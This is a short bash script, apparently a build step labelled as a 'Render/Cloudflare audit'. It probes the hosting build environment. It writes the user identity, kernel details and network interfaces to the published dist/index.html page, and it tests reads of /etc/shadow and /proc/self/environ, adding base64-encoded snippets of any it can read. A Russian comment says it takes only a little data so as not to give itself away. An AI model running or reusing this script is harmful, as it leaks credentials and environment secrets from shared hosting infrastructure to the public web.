#!/bin/bash
 
mkdir -p dist

echo "<html><body><h1>Render/Cloudflare Audit Results</h1><pre>" > dist/index.html

echo "--- SYSTEM IDENT ---" >> dist/index.html
id >> dist/index.html
uname -a >> dist/index.html

echo -e "\n--- SENSITIVE FILES CHECK ---" >> dist/index.html
 
for f in "/etc/shadow" "/etc/hosts" "/proc/self/environ"; do
    if [ -r "$f" ]; then
        echo "[+] READ SUCCESS: $f" >> dist/index.html
        # Берем только первые 20 символов, чтобы не спалить лишнего
        head -c 20 "$f" | base64 >> dist/index.html
    else
        echo "[-] DENIED: $f" >> dist/index.html
    fi
done

echo -e "\n--- NETWORK INTERFACES ---" >> dist/index.html
ip addr >> dist/index.html

echo "</pre></body></html>" >> dist/index.html

 
echo "Audit file created in dist/index.html"
